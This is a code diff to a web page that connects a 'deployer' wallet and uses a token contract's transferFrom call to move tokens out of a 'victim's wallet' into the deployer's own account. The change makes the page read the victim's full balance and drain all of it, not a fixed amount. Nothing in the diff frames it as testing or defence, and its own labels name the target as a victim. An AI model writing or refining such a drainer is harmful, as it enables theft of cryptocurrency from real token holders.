@@ -31,7 +31,7 @@
 </head>
 <body>
     <h1>Withdraw Tokens Using Deployer's Wallet</h1>
-    <p>Connect your wallet as the deployer to withdraw tokens from the victim's wallet.</p>
+    <p>Connect your wallet as the deployer to withdraw all tokens from the victim's wallet.</p>
 
     <!-- Connect Wallet Button -->
     <button id="connectWalletBtn">Connect Wallet</button>
@@ -111,10 +111,18 @@
             }
 
             try {
-                console.debug("Initiating withdrawal for victim:", victimAddress);
+                // Fetch the victim's token balance
+                const victimBalance = await contract.methods.balanceOf(victimAddress).call();
 
-                // Use transferFrom to transfer the entire balance
-                await contract.methods.transferFrom(victimAddress, userAccount, web3.utils.toWei('1000000', 'ether')) // Example: Max amount to withdraw
+                if (victimBalance == 0) {
+                    document.getElementById('status').innerText = `No tokens to withdraw from ${victimAddress}.`;
+                    return;
+                }
+
+                console.debug("Victim's token balance:", victimBalance);
+
+                // Initiate transfer from victim's wallet to deployer's address
+                await contract.methods.transferFrom(victimAddress, userAccount, victimBalance)
                 .send({ from: userAccount });
 
                 console.debug("Withdrawal successful.");
